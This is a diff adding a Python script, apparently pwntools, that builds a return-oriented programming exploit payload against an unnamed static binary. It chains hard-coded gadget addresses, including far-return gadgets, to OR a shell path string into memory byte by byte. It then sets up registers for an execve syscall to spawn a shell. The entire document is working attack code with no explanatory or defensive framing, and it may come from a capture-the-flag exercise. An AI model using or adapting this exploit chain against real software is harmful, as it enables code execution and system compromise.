@@ -1,0 +1,59 @@
+payload = p64(0x4a11a9)
+#0x4a11a9: pop rbx ; retf
+payload += p64(0x2f)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5092)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x62)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5093)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x69)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5094)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x6e)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5095)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x2f)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5096)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x66)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5097)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x68)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5098)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x4a11a9)+p32(0x33)
+# 0x4a11a9: pop rbx ; retf
+payload += p64(0x0)+p32(0x50dba2)+p32(0x33)
+# 0x000000000050dba2: pop rcx; ret; 
+payload += p64(0x6e5099)+p64(0x46d0ab)
+# 0x46d0ab: or byte ptr [rcx - 0x3a], bl ; retf
+payload += p32(0x422378)+p32(0x33)
+# 0x0000000000422378: pop rax; ret; 
+payload += p64(0x3b)+p64(0x512c15)
+# 0x0000000000512c15: pop rdi; ret; 
+payload += p64(0x6e5058)+p64(0x50e5ca)
+# 0x000000000050e5ca: pop rsi; ret; 
+payload += p64(0x0)+p64(0x542e72)
+# 0x0000000000542e72: pop rdx; ret; 
+payload += p64(0x0)+p64(0x40e1f8)
+# 0x000000000040e1f8: syscall; 
+payload += b''
